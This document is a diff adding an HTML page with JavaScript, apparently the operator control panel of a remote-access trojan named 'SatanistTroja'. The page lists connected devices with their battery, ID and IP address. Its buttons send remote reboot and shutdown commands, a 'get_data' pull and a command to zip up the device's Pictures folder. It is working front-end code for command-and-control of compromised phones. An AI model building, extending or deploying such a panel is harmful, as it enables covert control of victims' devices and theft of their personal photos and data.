@@ -1,1 +1,107 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>SatanistTroja - Управление устройствами</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Segoe UI', sans-serif; background: #0a0e17; color: #e6edf3; padding: 20px; }
+        .container { max-width: 900px; margin: 0 auto; }
+        h1 { font-size: 28px; margin-bottom: 20px; display: flex; align-items: center; gap: 10px; }
+        .header-info { font-size: 14px; color: #8b949e; font-weight: normal; }
+        .device { background: #161b22; border-radius: 16px; padding: 18px 20px; margin-bottom: 14px; border-left: 5px solid #2ea043; transition: all 0.3s; }
+        .device.offline { border-left-color: #da3633; opacity: 0.7; }
+        .device.online { border-left-color: #2ea043; }
+        .device-top { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px; }
+        .device-name { font-size: 20px; font-weight: bold; }
+        .device-status { font-size: 14px; display: flex; align-items: center; gap: 8px; }
+        .online-tag { color: #2ea043; }
+        .offline-tag { color: #da3633; }
+        .device-details { display: flex; flex-wrap: wrap; gap: 16px; margin-top: 8px; font-size: 14px; color: #8b949e; }
+        .device-details span { display: flex; align-items: center; gap: 4px; }
+        .device-actions { margin-top: 12px; display: flex; flex-wrap: wrap; gap: 8px; }
+        .btn { background: #238636; border: none; color: white; padding: 8px 16px; border-radius: 6px; cursor: pointer; font-size: 14px; transition: 0.2s; }
+        .btn:hover { background: #2ea043; transform: scale(1.02); }
+        .btn-danger { background: #da3633; }
+        .btn-danger:hover { background: #f85149; }
+        .btn-outline { background: transparent; border: 1px solid #30363d; color: #c9d1d9; }
+        .btn-outline:hover { background: #30363d; }
+        .empty { text-align: center; padding: 60px 20px; color: #8b949e; }
+        .empty .icon { font-size: 48px; margin-bottom: 16px; }
+        .last-seen { font-size: 12px; color: #8b949e; margin-top: 4px; }
+        .badge { background: #21262d; padding: 2px 10px; border-radius: 20px; font-size: 12px; }
+        @media (max-width: 600px) {
+            .device-top { flex-direction: column; align-items: flex-start; }
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h1>📱 SatanistTroja</h1>
+    <p style="color:#8b949e; margin-bottom: 20px;">Управление подключёнными устройствами</p>
+    <div id="devices">Загрузка...</div>
+</div>
 
+<script>
+    function fetchDevices() {
+        fetch('/api/devices')
+            .then(res => res.json())
+            .then(data => {
+                const container = document.getElementById('devices');
+                if (!data || data.length === 0) {
+                    container.innerHTML = `<div class="empty"><div class="icon">📭</div><p>Нет подключённых устройств</p></div>`;
+                    return;
+                }
+                container.innerHTML = data.map(d => {
+                    const isOnline = d.status === 'online';
+                    return `
+                        <div class="device ${isOnline ? 'online' : 'offline'}">
+                            <div class="device-top">
+                                <div class="device-name">${d.name || 'Без имени'}</div>
+                                <div class="device-status">
+                                    ${isOnline 
+                                        ? '<span class="online-tag">🟢 Онлайн</span>' 
+                                        : '<span class="offline-tag">🔴 Оффлайн</span>'}
+                                    <span class="badge">${d.model || 'Unknown'}</span>
+                                </div>
+                            </div>
+                            <div class="device-details">
+                                <span>🔋 ${d.battery !== undefined ? d.battery + '%' : 'N/A'}</span>
+                                <span>🆔 ${d.id ? d.id.substring(0, 8) + '...' : 'N/A'}</span>
+                                ${d.ip ? `<span>🌐 ${d.ip}</span>` : ''}
+                            </div>
+                            <div class="last-seen">Последний раз: ${d.last_seen ? new Date(d.last_seen).toLocaleString() : 'N/A'}</div>
+                            <div class="device-actions">
+                                <button class="btn" onclick="sendCommand('${d.id}', 'reboot')">🔄 Перезагрузить</button>
+                                <button class="btn btn-danger" onclick="sendCommand('${d.id}', 'shutdown')">⏻ Выключить</button>
+                                <button class="btn btn-outline" onclick="sendCommand('${d.id}', 'get_data')">📊 Данные</button>
+                                <button class="btn btn-outline" onclick="sendCommand('${d.id}', 'pictures')">📁 Pictures ZIP</button>
+                            </div>
+                        </div>
+                    `;
+                }).join('');
+            })
+            .catch(() => {
+                document.getElementById('devices').innerHTML = '<div class="empty"><div class="icon">⚠️</div><p>Ошибка загрузки</p></div>';
+            });
+    }
+
+    function sendCommand(deviceId, command) {
+        if (!confirm(`Отправить "${command}" на устройство?`)) return;
+        fetch('/api/command', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ deviceId, command })
+        })
+        .then(res => res.json())
+        .then(() => alert('✅ Команда отправлена'))
+        .catch(() => alert('❌ Ошибка отправки'));
+    }
+
+    // Обновляем каждые 10 секунд
+    setInterval(fetchDevices, 10000);
+    fetchDevices();
+</script>
+</body>
+</html>
